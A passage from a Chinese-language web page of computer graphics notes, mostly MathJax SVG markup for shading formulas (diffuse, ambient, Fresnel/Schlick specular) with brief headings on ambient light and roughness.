<mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="28.325ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 12519.5 1000" xmlns:xlink="http://www.w3.org/1999/xlink"><defs><path id="MJX-1-TEX-I-1D450" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"></path><path id="MJX-1-TEX-I-1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path><path id="MJX-1-TEX-N-3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path><path id="MJX-1-TEX-I-1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path><path id="MJX-1-TEX-I-1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path><path id="MJX-1-TEX-I-1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path><path id="MJX-1-TEX-N-28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path><path id="MJX-1-TEX-I-1D43F" d="M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z"></path><path id="MJX-1-TEX-N-22C5" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250Z"></path><path id="MJX-1-TEX-I-1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path><path id="MJX-1-TEX-N-2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path><path id="MJX-1-TEX-N-30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path><path id="MJX-1-TEX-N-29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path><path id="MJX-1-TEX-I-1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"></path><path id="MJX-1-TEX-N-2297" d="M56 250Q56 394 156 488T384 583Q530 583 626 485T722 250Q722 110 625 14T390 -83Q249 -83 153 14T56 250ZM582 471Q531 510 496 523Q446 542 381 542Q324 542 272 519T196 471L389 278L485 375L582 471ZM167 442Q95 362 95 250Q95 137 167 58L359 250L167 442ZM610 58Q682 138 682 250Q682 363 610 442L418 250L610 58ZM196 29Q209 16 230 2T295 -27T388 -42Q409 -42 429 -40T465 -33T496 -23T522 -11T544 1T561 13T574 22T582 29L388 222L196 29Z"></path></defs><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><use data-c="1D450" xlink:href="#MJX-1-TEX-I-1D450"></use></g><g data-mml-node="TeXAtom" transform="translate(466,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><use data-c="1D451" xlink:href="#MJX-1-TEX-I-1D451"></use></g></g></g><g data-mml-node="mo" transform="translate(1161.5,0)"><use data-c="3D" xlink:href="#MJX-1-TEX-N-3D"></use></g><g data-mml-node="mi" transform="translate(2217.3,0)"><use data-c="1D45A" xlink:href="#MJX-1-TEX-I-1D45A"></use></g><g data-mml-node="mi" transform="translate(3095.3,0)"><use data-c="1D44E" xlink:href="#MJX-1-TEX-I-1D44E"></use></g><g data-mml-node="mi" transform="translate(3624.3,0)"><use data-c="1D465" xlink:href="#MJX-1-TEX-I-1D465"></use></g><g data-mml-node="mo" transform="translate(4196.3,0)"><use data-c="28" xlink:href="#MJX-1-TEX-N-28"></use></g><g data-mml-node="mi" transform="translate(4585.3,0)"><use data-c="1D43F" xlink:href="#MJX-1-TEX-I-1D43F"></use></g><g data-mml-node="mo" transform="translate(5488.5,0)"><use data-c="22C5" xlink:href="#MJX-1-TEX-N-22C5"></use></g><g data-mml-node="mi" transform="translate(5988.7,0)"><use data-c="1D45B" xlink:href="#MJX-1-TEX-I-1D45B"></use></g><g data-mml-node="mo" transform="translate(6588.7,0)"><use data-c="2C" xlink:href="#MJX-1-TEX-N-2C"></use></g><g data-mml-node="mn" transform="translate(7033.4,0)"><use data-c="30" xlink:href="#MJX-1-TEX-N-30"></use></g><g data-mml-node="mo" transform="translate(7533.4,0)"><use data-c="29" xlink:href="#MJX-1-TEX-N-29"></use></g><g data-mml-node="mo" transform="translate(8144.6,0)"><use data-c="22C5" xlink:href="#MJX-1-TEX-N-22C5"></use></g><g data-mml-node="msub" transform="translate(8644.8,0)"><g data-mml-node="mi"><use data-c="1D435" xlink:href="#MJX-1-TEX-I-1D435"></use></g><g data-mml-node="TeXAtom" transform="translate(792,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><use data-c="1D43F" xlink:href="#MJX-1-TEX-I-1D43F"></use></g></g></g><g data-mml-node="mo" transform="translate(10190.6,0)"><use data-c="2297" xlink:href="#MJX-1-TEX-N-2297"></use></g><g data-mml-node="msub" transform="translate(11190.8,0)"><g data-mml-node="mi"><use data-c="1D45A" xlink:href="#MJX-1-TEX-I-1D45A"></use></g><g data-mml-node="TeXAtom" transform="translate(911,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><use data-c="1D451" xlink:href="#MJX-1-TEX-I-1D451"></use></g></g></g></g></g></svg></mjx-container>


<h2 id="6"><a href="#6" class="headerlink" title="6"></a>6</h2><p>环境光（ambient），用于简单模拟其他物体反射过来的间接光照</p>
<mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.355ex" xmlns="http://www.w3.org/2000/svg" width="13.777ex" height="1.975ex" role="img" focusable="false" viewBox="0 -716 6089.3 873.1" xmlns:xlink="http://www.w3.org/1999/xlink"><defs><path id="MJX-1-TEX-I-1D450" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"></path><path id="MJX-1-TEX-I-1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path><path id="MJX-1-TEX-N-3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path><path id="MJX-1-TEX-I-1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path><path id="MJX-1-TEX-I-1D43F" d="M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z"></path><path id="MJX-1-TEX-N-2297" d="M56 250Q56 394 156 488T384 583Q530 583 626 485T722 250Q722 110 625 14T390 -83Q249 -83 153 14T56 250ZM582 471Q531 510 496 523Q446 542 381 542Q324 542 272 519T196 471L389 278L485 375L582 471ZM167 442Q95 362 95 250Q95 137 167 58L359 250L167 442ZM610 58Q682 138 682 250Q682 363 610 442L418 250L610 58ZM196 29Q209 16 230 2T295 -27T388 -42Q409 -42 429 -40T465 -33T496 -23T522 -11T544 1T561 13T574 22T582 29L388 222L196 29Z"></path><path id="MJX-1-TEX-I-1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path><path id="MJX-1-TEX-I-1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></defs><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><use data-c="1D450" xlink:href="#MJX-1-TEX-I-1D450"></use></g><g data-mml-node="TeXAtom" transform="translate(466,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><use data-c="1D44E" xlink:href="#MJX-1-TEX-I-1D44E"></use></g></g></g><g data-mml-node="mo" transform="translate(1167.8,0)"><use data-c="3D" xlink:href="#MJX-1-TEX-N-3D"></use></g><g data-mml-node="msub" transform="translate(2223.6,0)"><g data-mml-node="mi"><use data-c="1D434" xlink:href="#MJX-1-TEX-I-1D434"></use></g><g data-mml-node="TeXAtom" transform="translate(783,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><use data-c="1D43F" xlink:href="#MJX-1-TEX-I-1D43F"></use></g></g></g><g data-mml-node="mo" transform="translate(3760.4,0)"><use data-c="2297" xlink:href="#MJX-1-TEX-N-2297"></use></g><g data-mml-node="msub" transform="translate(4760.6,0)"><g data-mml-node="mi"><use data-c="1D45A" xlink:href="#MJX-1-TEX-I-1D45A"></use></g><g data-mml-node="TeXAtom" transform="translate(911,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><use data-c="1D451" xlink:href="#MJX-1-TEX-I-1D451"></use></g></g></g></g></g></svg></mjx-container>


<h2 id="7"><a href="#7" class="headerlink" title="7"></a>7</h2><p>Fresnel equations（菲涅尔等式），Schlick approximation</p>
<p>粗糙度（roughness），镜面瓣（specular lobe）<br>镜面反射光（specular ）</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/image-20220316170926311.png" alt="image-20220316170926311"></p>
<mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -1.602ex" xmlns="http://www.w3.org/2000/svg" width="49.447ex" height="4.638ex" role="img" focusable="false" viewBox="0 -1342 21855.4 2050" xmlns:xlink="http://www.w3.org/1999/xlink"><defs><path id="MJX-1-TEX-I-1D450" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"></path><path id="MJX-1-TEX-I-1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path><path id="MJX-1-TEX-N-3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path><path id="MJX-1-TEX-I-1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path><path id="MJX-1-TEX-I-1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path><path id="MJX-1-TEX-I-1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path><path id="MJX-1-TEX-N-28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path><path id="MJX-1-TEX-I-1D43F" d="M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z"></path><path id="MJX-1-TEX-N-22C5" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250Z"></path><path id="MJX-1-TEX-I-1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path><path id="MJX-1-TEX-N-2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path><path id="MJX-1-TEX-N-30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path><path id="MJX-1-TEX-N-29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path><path id="MJX-1-TEX-I-1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"></path><path id="MJX-1-TEX-N-2297" d="M56 250Q56 394 156 488T384 583Q530 583 626 485T722 250Q722 110 625 14T390 -83Q249 -83 153 14T56 250ZM582 471Q531 510 496 523Q446 542 381 542Q324 542 272 519T196 471L389 278L485 375L582 471ZM167 442Q95 362 95 250Q95 137 167 58L359 250L167 442ZM610 58Q682 138 682 250Q682 363 610 442L418 250L610 58ZM196 29Q209 16 230 2T295 -27T388 -42Q409 -42 429 -40T465 -33T496 -23T522 -11T544 1T561 13T574 22T582 29L388 222L196 29Z"></path><path id="MJX-1-TEX-I-1D445" d="M230 637Q203 637 198 638T193 649Q193 676 204 682Q206 683 378 683Q550 682 564 680Q620 672 658 652T712 606T733 563T739 529Q739 484 710 445T643 385T576 351T538 338L545 333Q612 295 612 223Q612 212 607 162T602 80V71Q602 53 603 43T614 25T640 16Q668 16 686 38T712 85Q717 99 720 102T735 105Q755 105 755 93Q755 75 731 36Q693 -21 641 -21H632Q571 -21 531 4T487 82Q487 109 502 166T517 239Q517 290 474 313Q459 320 449 321T378 323H309L277 193Q244 61 244 59Q244 55 245 54T252 50T269 48T302 46H333Q339 38 339 37T336 19Q332 6 326 0H311Q275 2 180 2Q146 2 117 2T71 2T50 1Q33 1 33 10Q33 12 36 24Q41 43 46 45Q50 46 61 46H67Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628Q287 635 230 637ZM630 554Q630 586 609 608T523 636Q521 636 500 636T462 637H440Q393 637 386 627Q385 624 352 494T319 361Q319 360 388 360Q466 361 492 367Q556 377 592 426Q608 449 619 486T630 554Z"></path><path id="MJX-1-TEX-I-1D439" d="M48 1Q31 1 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q146 66 215 342T285 622Q285 629 281 629Q273 632 228 634H197Q191 640 191 642T193 659Q197 676 203 680H742Q749 676 749 669Q749 664 736 557T722 447Q720 440 702 440H690Q683 445 683 453Q683 454 686 477T689 530Q689 560 682 579T663 610T626 626T575 633T503 634H480Q398 633 393 631Q388 629 386 623Q385 622 352 492L320 363H375Q378 363 398 363T426 364T448 367T472 374T489 386Q502 398 511 419T524 457T529 475Q532 480 548 480H560Q567 475 567 470Q567 467 536 339T502 207Q500 200 482 200H470Q463 206 463 212Q463 215 468 234T473 274Q473 303 453 310T364 317H309L277 190Q245 66 245 60Q245 46 334 46H359Q365 40 365 39T363 19Q359 6 353 0H336Q295 2 185 2Q120 2 86 2T48 1Z"></path><path id="MJX-1-TEX-I-1D6FC" d="M34 156Q34 270 120 356T309 442Q379 442 421 402T478 304Q484 275 485 237V208Q534 282 560 374Q564 388 566 390T582 393Q603 393 603 385Q603 376 594 346T558 261T497 161L486 147L487 123Q489 67 495 47T514 26Q528 28 540 37T557 60Q559 67 562 68T577 70Q597 70 597 62Q597 56 591 43Q579 19 556 5T512 -10H505Q438 -10 414 62L411 69L400 61Q390 53 370 41T325 18T267 -2T203 -11Q124 -11 79 39T34 156ZM208 26Q257 26 306 47T379 90L403 112Q401 255 396 290Q382 405 304 405Q235 405 183 332Q156 292 139 224T121 120Q121 71 146 49T208 26Z"></path><path id="MJX-1-TEX-I-210E" d="M137 683Q138 683 209 688T282 694Q294 694 294 